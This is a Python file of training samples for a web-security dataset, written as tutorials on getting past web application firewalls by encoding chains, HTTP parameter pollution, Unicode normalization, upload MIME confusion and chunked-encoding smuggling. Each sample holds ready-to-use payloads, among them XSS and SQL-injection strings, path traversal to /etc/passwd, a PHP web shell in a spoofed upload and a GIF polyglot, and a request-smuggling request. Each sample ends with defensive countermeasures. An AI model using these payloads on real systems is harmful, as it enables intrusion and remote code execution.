#!/usr/bin/env python3
"""
Advanced WAF/Filter Evasion dataset:
encoding chains, HPP, Unicode normalization, MIME confusion,
chunked encoding bypass, and polyglot payloads.
"""

from generate_dataset import Sample

ADVANCED_EVASION_SAMPLES = [
    # ── Encoding Chain Bypass ────────────────────────────────────
    Sample(
        instruction="Explain how multi-layer encoding chains bypass WAF XSS filters.",
        input="Target: WAF blocks <script> and alert() strings; app URL-decodes once before rendering",
        output="""## Multi-Layer Encoding Chain WAF Bypass

WAFs that decode input only once are vulnerable to double/triple encoding.
The WAF sees encoded data and allows it; the backend decodes it further before rendering.

### Layer 1 — Single URL Encoding
```
?q=<script>alert(1)</script>
  ↓ WAF sees: %3Cscript%3Ealert(1)%3C/script%3E → blocks "<script>"
```

### Layer 2 — Double URL Encoding
```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
  ↓ WAF decodes once: %3Cscript%3Ealert(1)%3C/script%3E → looks encoded, allows it
  ↓ App decodes again: <script>alert(1)</script> → XSS executes
```

### Layer 3 — Mixed Encoding Chains

**HTML entity + URL encoding**
```
%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B
  ↓ URL decode: &lt;script&gt;alert(1)&lt;/script&gt;
  ↓ HTML render: <script>alert(1)</script>
```

**UTF-7 encoding (old IE)**
```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

**Hex encoding**
```javascript
// If eval() is reachable
\x3cscript\x3ealert(1)\x3c/script\x3e

// In attribute context
" onmouseover="\x61\x6c\x65\x72\x74\x28\x31\x29
```

### Unicode Full-Width Characters
Some WAFs only block ASCII characters:
```
ｓｃｒｉｐｔ  →  script (after Unicode normalization)
＜script＞alert(1)＜/script＞
```

### Verification Methodology

1. Send baseline payload → verify WAF block (HTTP 403 / custom block page)
2. URL-encode once → test again
3. URL-encode twice → test again
4. Try HTML entity encoding: `&lt;` `&gt;` `&amp;`
5. Combine: HTML encode the URL-encoded payload
6. Use Burp Repeater with "URL-encode as you type" disabled for manual control

```python
# Python helper for encoding chains
import urllib.parse

payload = "<script>alert(1)</script>"
single = urllib.parse.quote(payload)           # %3Cscript%3E...
double = urllib.parse.quote(single)            # %253Cscript%253E...
triple = urllib.parse.quote(double)            # %25253C...
print(f"Double: {double}")
print(f"Triple: {triple}")
```

### Defensive Countermeasure
- Decode all layers before WAF inspection (normalize input first)
- Canonicalize Unicode to NFC/NFKC before pattern matching
- Block both encoded and decoded forms simultaneously
""",
        category="evasion",
        subcategory="encoding_chain",
    ),

    # ── HTTP Parameter Pollution ─────────────────────────────────
    Sample(
        instruction="What is HTTP Parameter Pollution (HPP) and how is it used to bypass WAFs?",
        input="Target: Apache server, WAF inspects only the first parameter value",
        output="""## HTTP Parameter Pollution (HPP)

HPP exploits ambiguity in how servers handle duplicate query/body parameters.
When a WAF and backend disagree on which duplicate to use, the WAF inspects
the harmless one while the backend executes the malicious one.

### How Different Servers Handle Duplicates

| Server | Behavior for `a=1&a=2` |
|--------|------------------------|
| PHP / Apache | Last value: `a=2` |
| ASP.NET / IIS | Concatenated: `a=1,2` |
| JSP / Tomcat | First value: `a=1` |
| Flask (Python) | First value: `a=1` |
| Express.js | Array: `a=['1','2']` |
| nginx (pass-through) | Depends on upstream |

### WAF Bypass via HPP

**Scenario**: WAF inspects first value, backend uses last value.

```
# WAF sees: ?id=1 (benign)
# Backend sees: ?id=1' OR '1'='1 (SQLi)
GET /item?id=1&id=1' OR '1'='1--
```

**Split across parameter encoding**:
```
GET /search?q=alert&q=(1)
# Backend concatenates: q=alert(1) → XSS if rendered
```

**HPP in POST body (WAF reads GET, app reads POST)**:
```
GET /api/update?role=user
POST body: role=admin
# Some frameworks prefer POST body over GET — privilege escalation
```

### Content-Type Splitting

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrong&username=admin'--
```
If the backend uses the *last* `username`, the SQLi payload executes.

### Advanced: Parameter Fragmentation

Split a blocked keyword across two parameters that get concatenated server-side:

```
?callback=ale&callback=rt(1)
# Server-side: callback = "ale" + "rt(1)" = "alert(1)"
# WAF only sees individual harmless pieces
```

### Testing Methodology

```python
import requests

url = "https://target.com/search"
# Test which duplicate wins
r1 = requests.get(url, params=[("q","FIRST"),("q","SECOND")])
# Check whether response contains FIRST or SECOND to identify behavior
```

### Defensive Countermeasure
- Define strict parameter handling policy (first, last, or reject duplicates)
- WAF must normalize all duplicates before inspection
- Reject requests with duplicate security-sensitive parameters
""",
        category="evasion",
        subcategory="hpp",
    ),

    # ── Unicode Normalization Attacks ────────────────────────────
    Sample(
        instruction="How do Unicode normalization vulnerabilities enable authentication bypass and path traversal?",
        input="Target: Python web app using unicodedata.normalize('NFKC', path) before security checks",
        output="""## Unicode Normalization Attacks

Unicode has multiple representations for the same visual character.
When security checks happen *before* normalization but business logic
runs *after*, the disparity creates vulnerabilities.

### Unicode Normalization Forms

| Form | Description | Example |
|------|-------------|---------|
| NFC | Canonical Decomposed → Composed | `é` (U+00E9) |
| NFD | Canonical Decomposed | `e` + `◌́` (U+0065 + U+0301) |
| NFKC | Compatibility Composed | `ﬁ` → `fi`, `①` → `1` |
| NFKD | Compatibility Decomposed | `ℌ` → `H` |

### Path Traversal via Unicode Normalization

NFKC normalizes some Unicode characters to their ASCII equivalents:

```python
# These normalize to "/" after NFKC:
"∕"  →  "/" (U+2215 DIVISION SLASH)
"⁄"  →  "/" (U+2044 FRACTION SLASH)
"／"  →  "/" (U+FF0F FULLWIDTH SOLIDUS)

# Bypass path traversal filter:
# Security check sees: "..∕..∕..∕etc∕passwd" (no "../")
# After NFKC normalize: "../../../../etc/passwd" ← actual path
```

**Exploitation**:
```
GET /download?file=..%E2%88%95..%E2%88%95..%E2%88%95etc%E2%88%95passwd
# %E2%88%95 = U+2215 ∕ → normalizes to /
```

### Authentication Bypass via Username Normalization

```python
# Admin account: "admin" (U+0061 U+0064 U+006D U+0069 U+006E)
# Attack:  "ɑdmin" where ɑ = U+0251 (LATIN SMALL LETTER ALPHA)
# After NFKC: ɑ → a → matches "admin"

# Registration: create account with Unicode lookalike
POST /register  username=ɑdmin  password=hacked

# Login with registered account hits admin session/permissions
POST /login     username=ɑdmin  password=hacked
```

### Case-Folding Attacks

```python
# Turkish dotless-i: 'İ'.lower() == 'i' in Turkish locale
# 'ß'.upper() == 'SS' in German
# 'ﬃ' NFKC → 'ffi'

# Email normalization bypass
"admin@example.com" vs "ADMIN@example.com" vs "ａｄｍｉｎ@example.com"
# All may resolve to same account depending on normalization
```

### Detection & Exploitation Script

```python
import unicodedata
import requests

lookalikes = {
    'a': ['ɑ','а','α','ａ'],  # Latin alpha, Cyrillic a, Greek alpha, fullwidth
    'e': ['е','ε','ｅ'],
    'o': ['о','ο','ｏ'],
    '/': ['∕','⁄','／'],
    '.': ['․','‥','．'],
}

def fuzz_normalization(base_username):
    for pos, char in enumerate(base_username):
        if char in lookalikes:
            for sub in lookalikes[char]:
                test = base_username[:pos] + sub + base_username[pos+1:]
                normalized = unicodedata.normalize('NFKC', test)
                if normalized == base_username:
                    print(f"Lookalike: {test} → {normalized}")
                    # Try registering/using this username
```

### Defensive Countermeasure
- Normalize *before* all security checks (not after)
- Reject non-ASCII in usernames/paths where Unicode is unexpected
- Use `unicodedata.normalize('NFKC', s).encode('ascii', 'ignore')` for path validation
""",
        category="evasion",
        subcategory="unicode_normalization",
    ),

    # ── Content-Type / MIME Confusion ────────────────────────────
    Sample(
        instruction="How does Content-Type confusion bypass upload filters and enable XSS/RCE?",
        input="Target: file upload endpoint that checks Content-Type header and file extension",
        output="""## Content-Type / MIME Confusion Attacks

Upload filters that trust the client-controlled `Content-Type` header are trivially
bypassed. Even extension-based checks can be defeated through MIME sniffing and
polyglot files.

### Attack 1 — Header Spoofing (Simplest)

Server checks `Content-Type: image/jpeg` → allows upload.
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg   ← spoofed; browser/curl allows arbitrary value

<?php system($_GET['cmd']); ?>
------Boundary--
```

### Attack 2 — Double Extension

```
shell.php.jpg    # Server may strip .jpg and execute .php
shell.php%00.jpg # Null byte (older PHP — truncates at null)
shell.pHp        # Case variation if check is case-sensitive
shell.php5       # Alternative PHP extensions
shell.phtml
shell.pht
shell.shtml      # SSI execution
```

### Attack 3 — MIME Sniffing (X-Content-Type-Options missing)

IE and some Chromium versions sniff file content regardless of Content-Type:
```
# Upload a file with Content-Type: text/plain
# But file content starts with: <script>alert(1)</script>
# IE sniffs HTML → executes as HTML
```

If the server is missing: `X-Content-Type-Options: nosniff`
→ Upload file with HTML content, serve at a URL users visit.

### Attack 4 — Polyglot Files (Image + PHP/JS)

A valid JPEG that is also valid PHP:
```
# Real PoC: GIF polyglot
GIF89a<?php system($_GET['cmd']); ?>

# File starts with GIF89a magic bytes → passes image validation
# PHP interpreter ignores binary GIF header → executes PHP code
```

**Create with ImageMagick**:
```bash
# Inject PHP into EXIF comment field
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

### Attack 5 — SVG Upload → XSS

SVG is XML with embedded JS; often overlooked by image validators:
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```
If served with `Content-Type: image/svg+xml` → XSS executes in victim's browser.

### Testing Methodology

```bash
# 1. Upload .php file as image/jpeg
# 2. Try double extensions
# 3. Try null byte (Burp → hex editor → replace 0x2e with 0x00 in extension)
# 4. Try polyglot: exiftool injection into valid JPEG
# 5. Upload SVG with XSS payload
# 6. Check if X-Content-Type-Options is set
curl -I https://target.com/uploads/test.jpg | grep -i content-type
```

### Defensive Countermeasure
- Validate file type by magic bytes (not headers or extensions)
- Regenerate uploaded images using PIL/ImageMagick to strip payloads
- Serve uploads from separate origin/CDN with `nosniff` and strict CSP
- Rename files to random UUIDs on the server side
""",
        category="evasion",
        subcategory="mime_confusion",
    ),

    # ── Chunked Encoding / HTTP Smuggling for WAF Bypass ─────────
    Sample(
        instruction="How can chunked transfer encoding be abused to smuggle payloads past a WAF?",
        input="Target: AWS ALB → nginx reverse proxy; WAF inspects HTTP/1.1 request bodies",
        output="""## Chunked Encoding WAF Bypass

When a WAF and backend disagree on how to parse chunked request bodies,
payloads can be split across chunk boundaries so the WAF never sees
the complete malicious string.

### HTTP Chunked Transfer Encoding Basics

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

4\r\n
Wiki\r\n
5\r\n
pedia\r\n
0\r\n
\r\n
```
Body is: `Wikipedia` (assembled from chunks)

### Bypass 1 — Split Payload Across Chunks

WAF inspects each chunk individually; backend assembles them:

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3\r\n
ali\r\n          ← WAF sees "ali" — benign
3\r\n
as;\r\n          ← WAF sees "as;" — benign
4\r\n
id\r\n           ← WAF sees "id" — benign
0\r\n\r\n        ← Backend assembles: "alias;id" — command injection!
```

### Bypass 2 — Obfuscate Transfer-Encoding Header

Some WAFs only match exact `Transfer-Encoding: chunked`:
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked          (space before colon)
Transfer-Encoding: chunked           (tab indent)
X-Transfer-Encoding: chunked
Transfer-Encoding: Chunked           (capital C)
```

If the WAF ignores the obfuscated TE header, it reads body as Content-Length.
The backend honors the TE header and reads chunked → body interpretation mismatch.

### Bypass 3 — TE.CL Smuggling to Bypass WAF

```
[WAF] → [Load Balancer] → [Backend]
WAF uses Content-Length; Backend uses Transfer-Encoding
```

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0\r\n
\r\n
GET /admin HTTP/1.1\r\n
X-Ignore: x
```

The WAF reads 30 bytes (CL=30), sees an incomplete-looking request.
The backend reads until `0\r\n\r\n` → processes two separate requests,
the second one being `GET /admin`.

### Bypass 4 — Chunk Extension Obfuscation

```http
5;iAmIgnored\r\n
Hello\r\n
```
Some WAFs fail to parse chunk extensions, rejecting or misreading the body.

### Detection Tool

```bash
# smuggler.py — automated HTTP request smuggling detection
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u "https://target.com/" -t 5
```

### Manual Burp Test

1. Burp → Repeater → change request method to POST
2. Add `Transfer-Encoding: chunked` header
3. Send body in chunked format with split payload
4. Compare WAF response vs. direct backend response (if accessible)

### Defensive Countermeasure
- Normalize requests at WAF layer: reassemble chunked body before inspection
- Ensure WAF and backend agree on `Transfer-Encoding` priority
- Deploy WAF in inline mode (not monitoring) so it sees reassembled streams
- Use HTTP/2 end-to-end (no chunked encoding in HTTP/2)
""",
        category="evasion",
        subcategory="chunked_encoding_bypass",
    ),
]
